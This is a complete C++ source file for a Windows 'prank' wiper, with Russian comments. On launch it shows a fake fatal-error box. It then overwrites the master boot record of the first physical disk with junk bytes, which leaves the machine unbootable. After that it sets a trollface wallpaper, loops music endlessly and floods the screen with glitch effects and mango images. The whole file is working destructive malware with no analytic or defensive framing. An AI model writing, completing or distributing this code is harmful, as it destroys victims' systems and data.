#include <windows.h>
#include <gdiplus.h>
#include <mmsystem.h>
#include <cstdlib>
#include <ctime>
#include <string>

#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "ole32.lib")

#define IDB_MANGO 101
#define IDR_FUNK  102
#define IDB_TROLL 103

std::wstring tempMp3Path;
std::wstring tempTrollPath;

// Функция для извлечения бинарных ресурсов во временные файлы
bool ExtractResourceToFile(int resourceId, const std::wstring& outPath) {
    HRSRC hResource = FindResource(NULL, MAKEINTRESOURCE(resourceId), RT_RCDATA);
    if (!hResource) return false;

    DWORD size = SizeofResource(NULL, hResource);
    HGLOBAL hResData = LoadResource(NULL, hResource);
    if (!hResData) return false;

    void* pBuffer = LockResource(hResData);
    HANDLE hFile = CreateFileW(outPath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return false;

    DWORD bytesWritten;
    WriteFile(hFile, pBuffer, size, &bytesWritten, NULL);
    CloseHandle(hFile);
    return true;
}

// Низкоуровневое уничтожение Главной загрузочной записи (MBR)
void OverwriteMbr() {
    char mbrData[512];
    // Заполняем массив мусорным байтом 0x66
    memset(mbrData, 0x66, sizeof(mbrData));

    // Записываем стандартную сигнатуру загрузочного сектора в конец буфера
    mbrData[510] = (char)0x55;
    mbrData[511] = (char)0xAA;

    // Открываем первый физический диск напрямую для записи байтов
    HANDLE hDisk = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_WRITE, 
        FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    
    if (hDisk != INVALID_HANDLE_VALUE) {
        DWORD bytesWritten;
        // Перезаписываем самый первый сектор диска (LBA 0)
        WriteFile(hDisk, mbrData, 512, &bytesWritten, NULL);
        CloseHandle(hDisk);
    }
}

// Поток для бесконечного воспроизведения музыки
DWORD WINAPI PlayMp3Thread(LPVOID lpParam) {
    wchar_t tempDir[MAX_PATH];
    GetTempPathW(MAX_PATH, tempDir);
    tempMp3Path = std::wstring(tempDir) + L"funk_temp.mp3";

    if (!ExtractResourceToFile(IDR_FUNK, tempMp3Path)) return 0;

    std::wstring openCmd = L"open \"" + tempMp3Path + L"\" type mpegvideo alias mp3audio";
    
    while (true) {
        mciSendStringW(openCmd.c_str(), NULL, 0, NULL);
        mciSendStringW(L"play mp3audio wait", NULL, 0, NULL);
        mciSendStringW(L"close mp3audio", NULL, 0, NULL);
    }
    return 0;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // 1. Показ критического сообщения поверх всех окон
    MessageBoxA(NULL, "Pc has been wasted!", "Fatal Error", MB_OK | MB_ICONERROR | MB_SYSTEMMODAL);

    // 2. Деструктивный шаг (требует прав администратора из манифеста)
    OverwriteMbr();

    // Скрываем окно консоли, если запуск произошел через нее
    HWND hConsole = GetConsoleWindow();
    if (hConsole) ShowWindow(hConsole, SW_HIDE);

    srand(static_cast<unsigned int>(time(NULL)));

    wchar_t tempDir[MAX_PATH];
    GetTempPathW(MAX_PATH, tempDir);
    tempTrollPath = std::wstring(tempDir) + L"trollface_temp.jpg";

    // Изменение обоев рабочего стола
    if (ExtractResourceToFile(IDB_TROLL, tempTrollPath)) {
        SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, (void*)tempTrollPath.c_str(), SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
    }

    // Инициализация графической подсистемы GDI+
    Gdiplus::GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

    HRSRC hResource = FindResource(hInstance, MAKEINTRESOURCE(IDB_MANGO), RT_RCDATA);
    if (!hResource) return 0;

    DWORD imageSize = SizeofResource(hInstance, hResource);
    HGLOBAL hResData = LoadResource(hInstance, hResource);
    if (!hResData) return 0;

    void* pBuffer = LockResource(hResData);
    HGLOBAL hGlobal = GlobalAlloc(GMEM_MOVEABLE, imageSize);
    if (!hGlobal) return 0;

    void* pCopyBuffer = GlobalLock(hGlobal);
    RtlCopyMemory(pCopyBuffer, pBuffer, imageSize);
    GlobalUnlock(hGlobal);

    IStream* pStream = NULL;
    if (CreateStreamOnHGlobal(hGlobal, TRUE, &pStream) != S_OK) return 0;

    Gdiplus::Image* pImage = Gdiplus::Image::FromStream(pStream);

    if (pImage && pImage->GetLastStatus() == Gdiplus::Ok) {
        int screenWidth = GetSystemMetrics(SM_CXSCREEN);
        int screenHeight = GetSystemMetrics(SM_CYSCREEN);

        const int minSize = 30;
        const int maxSize = 80;

        // Запуск потока фоновой музыки
        CreateThread(NULL, 0, PlayMp3Thread, NULL, 0, NULL);

        // Бесконечный цикл визуальных глитчей
        while (true) {
            HDC hdc = GetDC(NULL);
            if (hdc) {
                // Эффект разрыва экрана (Screen Tear)
                int glitchY = rand() % screenHeight;
                int glitchHeight = 10 + (rand() % 50); 
                int shiftX = (rand() % 40) - 20;       

                BitBlt(hdc, shiftX, glitchY, screenWidth, glitchHeight, hdc, 0, glitchY, SRCCOPY);

                // Отрисовка разлетающихся картинок манго
                Gdiplus::Graphics graphics(hdc);
                
                int targetWidth = minSize + (rand() % (maxSize - minSize + 1));
                int targetHeight = targetWidth;

                int x = rand() % (screenWidth - targetWidth);
                int y = rand() % (screenHeight - targetHeight);

                graphics.DrawImage(pImage, x, y, targetWidth, targetHeight);
                
                ReleaseDC(NULL, hdc);
            }
            Sleep(1); // Максимально агрессивная скорость мерцания
        }
    }

    // Теоретическая очистка ресурсов (сюда код не дойдет из-за бесконечного цикла)
    delete pImage;
    pStream->Release();
    Gdiplus::GdiplusShutdown(gdiplusToken);
    
    mciSendStringW(L"close mp3audio", NULL, 0, NULL);
    DeleteFileW(tempMp3Path.c_str());

    return 0;
}
